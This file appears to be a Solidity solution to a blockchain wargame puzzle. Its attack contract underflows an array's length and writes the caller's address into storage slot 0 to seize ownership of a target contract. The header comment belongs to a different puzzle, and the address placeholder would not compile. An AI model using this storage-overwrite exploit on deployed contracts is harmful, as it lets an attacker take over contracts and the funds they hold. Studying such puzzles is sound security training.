//calling a telephone, tx.origin != msg.sender

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlien {
    function make_contact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract Attacker {
    function run() external {
        address inst = "yout_instance_address";
        IAlien alien = IAlien(inst);

        alien.make_contact();
        alien.retract(); //make the size 2^256

        uint idx = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 newOwner = bytes32(uint256(uint160(tx.origin))); //me, you, whoever
        alien.revise(idx, newOwner);
    }
}
